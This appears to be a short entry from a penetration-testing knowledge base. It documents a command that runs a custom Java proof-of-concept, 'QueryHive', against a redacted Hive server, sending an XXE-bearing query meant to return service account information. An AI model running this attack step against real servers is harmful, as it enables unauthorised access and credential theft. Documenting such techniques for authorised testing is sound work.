---
data: 'java -classpath ''.:./runtime/*'' QueryHive ██████:10000 $CMD'
tags:
  - java
  - xxe
type: command
executor: bash
platforms:
  - Linux
id: ab711f93-2dc6-4b91-b54d-d38d0b0aa34c
created_at: '2025-12-13T09:00:27.732Z'
updated_at: '2025-12-13T09:00:27.732Z'
verified: false
validated: true
submitted: true
---
# java-queryhive-xxe

## Command

```bash
java -classpath '.:./runtime/*' QueryHive ██████:10000 $CMD
```

## Description

Executes XXE query using Java POC.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-classpath '.:./runtime/*'` | Includes runtime dependencies | Yes |
| `██████:10000` | Hive server address | Yes |
| `$CMD` | SQL query with XXE | Yes |

## Examples

### Basic Usage

```bash
java -classpath '.:./runtime/*' QueryHive ██████:10000 $CMD
```

## Expected Output

Service account information

## Related

- [[procedures/Reproduce-Exploitation-with-Custom-Java-POC]]
